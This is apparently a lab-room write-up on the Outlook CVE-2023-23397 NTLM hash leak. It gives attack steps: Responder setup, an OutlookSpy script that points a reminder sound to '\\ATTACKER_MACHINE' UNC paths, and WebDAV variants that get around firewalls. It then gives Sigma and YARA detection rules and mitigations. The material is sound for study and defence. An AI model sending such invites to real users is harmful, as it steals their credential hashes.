Outlook NTLM Leak Room:
========================

name : Eviyatar Cohen

Date : 25.3.2023

---------------------------------------------------------------------------------
Introduction:
==============

On Tuesday, March 14th, Microsoft released 83 security fixes on Patch Tuesday, including *CVE-2023-23397*. This critical vulnerability impacts all versions of the Outlook desktop app on any Windows system.

Outlook web app (OWA) and Microsoft 365 aren't vulnerable since they do not support NTLM authentication.

Unlike most exploits, this one is particularly dangerous because it is a zero-click exploit, meaning no user interaction is required to trigger it.
Once an infected email arrives in the user's inbox, the attacker can obtain sensitive Net-NTLMv2 credential hashes.
Once malicious actors have those hashes, they can get a user's credentials, authenticate to their system and escalate privileges.

----------------------------------------------------------------------------------
Abusing Appointment Alerts:
============================

Outlook Appointment Alerts:
=============================

On Outlook, it's possible to add reminder notifications when sending calendar invitations: (Image in PNG_Files name:calendar_invitation)

There You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file. (Image in PNG_Files name:Reminder_Sound1,Reminder_Sound2)

Now Manipulating this parameter can enable a threat actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.

---------------------------------------------------------------------------------

Abusing Reminder Sounds via UNC Paths:
========================================

To exploit this vulnerability, an attacker must create a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attacker's machine.
At a low level, an Outlook email stores the reference to the sound file in an internal parameter called "PidLidReminderFileParameter".

To ensure that the audio we embed in our malicious email will take precedence over the victim's default reminder configurations, we will also need to set another parameter called "PidLidReminderOverride" to True.

To set up the PidLidReminderFileParameter property to point to a network share, the attacker can specify a Universal Naming Convention (UNC) path instead of a local file.

What is UNC?
--------------
UNC is used in Windows operating systems to find network resources (files, printers, shared documents).
These paths consist of a double backslash, the IP address or name of the computer hosting the resource, the share name and the file name.

Example for this path is: "\\ATTACKER_IP\foo\bar.wav"

---------------------------------------------------------------------------------
When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability.

This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.

(Image of that process in PNG_Files name:UNC_Paths)

Now If for some reason the SMB protocol isn't a viable alternative to use, non-server versions of Windows will accept using UNC paths pointing to ports 80 or 443, and use HTTP to retrieve the file from a WebDAV-enabled web server.

The syntax of such UNC path is as follows:
------------------------------------------

* \\ATTACKER_IP@80\foo\bar.wav *

* \\ATTACKER_IP@443\foo\bar.wav *

This may be useful to bypass firewall restrictions preventing outgoing connections to port 445 (SMB).

---------------------------------------------------------------------------------
Crafting a Malicious Appointment:
==================================

Setting up Responder:
=====================

Since we expect the victim to trigger an authentication attempt against the attacker on port 445, we will set up Responder to handle the authentication process and capture the NetNTLM hash for us.

If you are unfamiliar with Responder, it will simply emulate an SMB server and capture any authentication attempt against it.

To launch Responder to listen for authentication attempts in your ens(enhanced networking capabilities)5 interface, you can simply run the following command in your machine:
--------------------------------------------------------------------------------
* responder -I ens5 * (You run this command as root in you terminal and also you can replace the enc with eth0 if your using different interfaces.)

---------------------------------------------------------------------------------
Attempting to Handcraft a Malicious Appointment:
=================================================

As a first attempt, we could manually create an appointment and edit the path to the reminder's sound file to point to a shared folder.

We will create an appointment that includes a reminder set in 0 minutes so that it triggers right after the victim receives it.
We will also click on the Sound option to configure the reminder's sound file.(Image in PNG_Files name:Config_Reminder_Sound)

Now, we can set the sound file path to a UNC path that points to our Machine and click OK.
However, Outlook will Sliently ignore the UNC path and revert to using the default WAV file, which can be confirmed by going back to the Sound dialogue.

Since Outlook isn't expecting users to input a UNC path here, it probably discards our attempt as invalid output.
But We can do this in other Ways..

---------------------------------------------------------------------------------
OutlookSpy:
============

Even if Outlook cannot set the reminder's sound file to a UNC path, we can use the OutlookSpy plugin to achieve this.

This plugin allow you to access all of Outlook's internal parameters directly, including the reminder's sound file.

To view our current appointment from OutlookSpy, click the "OutlookSpy" tab and then the "CurrentItem" button in the taskbar.(Image in PNG_Files name:OutlookSpy)

*Note*: Be sure to click the CurrentItem button from within the appointment, or you might modify different Outlook components.

---------------------------------------------------------------------------------
Now, you can see the parameters associated with the appointment's reminder.

We want to set the "ReminderSoundFile" parameter to the UNC path that points to our Machine and set both the "ReminderOverrideDefault" and "ReminderPlaySound" to true.

But what each parameter does?
-------------------------------
* ReminderPlaySound: boolean value that indicates if a sound will be played with the reminder.

* ReminderOverrideDefault: boolean value that indicates the receiving Outlook client to play the sound pointed by "ReminderSoundFile", instead of the default one.

* ReminderSoundFile: string with the path to the sound file to be used For our exploit, this will point to a bogus shared folder in our Machine.

Alternativly we can use the script tab with the follow script to change those parameters values that are requird:
--------------------------------------

AppointmentItem.ReminderOverrideDefault = true
AppointmentItem.ReminderPlaySound = true
AppointmentItem.ReminderSoundFile = "\\ATTACKER_MACHINE\nonexistent\sound.wav"

*NOTE*: Be sure to click the Run button for the changes to be applied. 

---------------------------------------------------------------------------------
Finally, save your appointment to add it to your calendar.
making sure the reminder is set to 0 minutes and that the appointment matches the current time and date as we want it to trigger immediately.
(Image in PNG_Files name:Appointment_Save)

If all went as expected, you should immediately see a reminder popping up And you should receive the authentication attempt in your Responder console on your Machine.

(Image in PNG_Files name:Authentication_Attempt)

---------------------------------------------------------------------------------
Detection/Mitigation:
=======================

Now, let's talk about a few ways to detect this attack within the network.

Each attack leaves patterns or artifacts that could help the detection team identify the threats.
It all depends on the network visibility and the log sources that are being collected and providing the much important visibility.

Here, we will discuss a few ways to detect this attack on the host :
---------------------------------------------------------------------
Sigma Rules:
-------------
A Sigma rule is a generic and open, YAML-based signature format that enables a security operations team to describe relevant log events in a flexible and standardized format.

The following Sigma rule detects Outlook initiating a connection to a WebDav or SMB share, indicating a post-exploitation phase:
----------------------------------------------------
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

title: CVE-2023-23397 Exploitation Attempt
id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
status: experimental
description: Detects outlook initiating connection to a WebDAV or SMB share, which
  could be a sign of CVE-2023-23397 exploitation.
author: Robert Lee @quantum_cookie
date: 2023/03/16
references:
- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
tags:
- attack.credential_access
- attack.initial_access
- cve.2023.23397
logsource:
  service: security
  product: windows
  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
    keys used in this rule'
detection:
  selection:
    EventID:
    - 4656
    - 4663
    ProcessName|endswith: \OUTLOOK.EXE
    Accesses|contains: Query key value
    ObjectName|contains|all:
    - \REGISTRY\MACHINE\SYSTEM
    - Services\
    ObjectName|endswith:
    - WebClient\NetworkProvider
    - LanmanWorkstation\NetworkProvider
  condition: selection
falsepositives:
- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
  it's better to filter out those events before they reach the SIEM
level: critical

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

---------------------------------------------------------------------------------
This Sigma Rule looks to detect svchost.exe spawning rundll32.exe with command arguments like: "C:\windows\system32\davclnt.dll,DavSetCookie".
which indicates a post-exploitation/exfiltration phase.

Another Sigma Rule:
---------------------
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

title: Suspicious WebDav Client Execution
id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
status: experimental
description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
  like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of
  exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
  a sign of exploitation of CVE-2023-23397

  '
references:
- https://twitter.com/aceresponder/status/1636116096506818562
- https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
- https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
author: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)
date: 2023/03/16
tags:
- attack.exfiltration
- attack.t1048.003
- cve.2023.23397
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: \svchost.exe
    Image|endswith: \rundll32.exe
    CommandLine|contains: C:\windows\system32\davclnt.dll,DavSetCookie
    CommandLine|re: ://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
  filter_local_ips:
    CommandLine|contains:
    - ://10.
    - ://192.168.
    - ://172.16.
    - ://172.17.
    - ://172.18.
    - ://172.19.
    - ://172.20.
    - ://172.21.
    - ://172.22.
    - ://172.23.
    - ://172.24.
    - ://172.25.
    - ://172.26.
    - ://172.27.
    - ://172.28.
    - ://172.29.
    - ://172.30.
    - ://172.31.
    - ://127.
    - ://169.254.
  condition: selection and not 1 of filter_*
falsepositives:
- Unknown
level: high

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

---------------------------------------------------------------------------------
These SIGMA rules can be converted into the detection and monitoring tool to hunt for suspicious log activity within the network.

(I will upload in the future a conclusion about Sigma rules.)

---------------------------------------------------------------------------------

Yara Rule:
-----------
What is Yara rule?
-------------------
YARA rules are malware detection patterns that are fully customizable to identify targeted attacks and security threats specific to your environment.

YARA rules are applied only to objects submitted to the internal Virtual Analyzer.

(Virtual Analyzer is a secure virtual environment that manages and analyzes objects submitted by integrated products and administrators.)

---------------------------------------------------------------------------------
The following three community YARA rules can be used to detect the suspicious MSG file on the disk with two properties:
-------------------------------------------
*(1)*
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

rule SUSP_EXPL_Msg_CVE_2023_23397_Mar23 {
   meta:
      description = "MSG file with a PidLidReminderFileParameter property, potentially exploiting CVE-2023-23397"
      author = "delivr.to, modified by Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-17"
      score = 60
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ UNC path prefix - wide formatted */
      $u1 = { 00 00 5C 00 5C 00 }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      uint32be(0) == 0xD0CF11E0
      and uint32be(4) == 0xA1B11AE1
      and 1 of ($psetid*)
      and $rfp
      and $u1
      and not 1 of ($fp*)
}

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
*(2)*
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
rule EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 {
   meta:
      description = "Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)"
      author = "delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-18"
      score = 75
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
      hash = "e7a1391dd53f349094c1235760ed0642519fd87baf740839817d47488b9aef02"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ + IP UNC path prefix - wide formatted */
      $u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) }
      /* \\ + IP UNC path prefix - regular/ascii formatted for Transport Neutral Encapsulation Format */
      $u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      (
         uint16(0) == 0xCFD0 and 1 of ($psetid*)
         or
         uint32be(0) == 0x789F3E22
      )
      and any of ( $u* )
      and $rfp
      and not 1 of ($fp*)
}

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
*(3)*
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
rule EXPL_SUSP_Outlook_CVE_2023_23397_SMTP_Mail_Mar23 {
   meta:
      author = "Nils Kuhnert"
      date = "2023-03-17"
      description = "Detects suspicious *.eml files that include TNEF content that possibly exploits CVE-2023-23397. Lower score than EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 as we're only looking for UNC prefix."
      score = 60
      reference = "https://twitter.com/wdormann/status/1636491612686622723"
   strings:
      // From:
      $mail1 = { 0A 46 72 6F 6D 3A 20 }
      // To: 
      $mail2 = { 0A 54 6F 3A }
      // Received:
      $mail3 = { 0A 52 65 63 65 69 76 65 64 3A }
      // Indicates that attachment is TNEF
      $tnef1 = "Content-Type: application/ms-tnef" ascii
      $tnef2 = "\x78\x9f\x3e\x22" base64
      // Check if it's an IPM.Task
      $ipm = "IPM.Task" base64
      // UNC prefix in TNEF
      $unc = "\x00\x00\x00\x5c\x5c" base64
   condition:
      all of them
}

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

---------------------------------------------------------------------------------
Powershell script:
-------------------
Microsoft has released a PowerShell script that will check the Exchange messaging items like Mail, calendar,  and tasks to see if they are related to the CVE-2023-23397 attack.
The script can be used to audit and clean the detected items.

(You can find the script in the Powershell_Script(Detection) Folder name:CVE-2023-23397.ps1).

---------------------------------------------------------------------------------

Mitigation:
============

Some of the recommended steps as recommended by Microsoft in order to mitigate and avoid this attack are:
---------------------------

* Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.

* Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.

* Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.

* Disable WebClient service to avoid webdav connection.

---------------------------------------------------------------------------------



















